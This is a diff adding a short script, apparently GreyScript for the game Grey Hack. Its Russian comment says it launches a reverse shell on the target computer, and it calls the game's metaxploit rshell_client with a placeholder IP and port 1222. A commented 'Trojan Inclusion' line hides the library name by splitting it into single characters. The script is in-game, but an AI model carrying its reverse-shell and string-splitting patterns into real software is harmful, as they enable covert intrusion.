@@ -1,0 +1,16 @@
+//запускает ршел на целевом компьютере
+includeLib = function(libName)
+	paths = [current_path, "/lib", "/bin", "/usr/bin"]
+	for i in paths
+		lib = include_lib(i + "/" + libName)
+		if lib then return lib
+	end for
+	print("Library not found: " + libName)
+	return false
+end function
+
+LibX = includeLib("metaxploit.so")
+print(LibX.rshell_client("IP",1222,"PROCESSNAME"))
+
+//Trojan Inclusion
+//includeLib("m"+"e"+"t"+"a"+"x"+"p"+"l"+"o"+"i"+"t"+"."+"s"+"o").rshell_client("IP",1222,"ps")
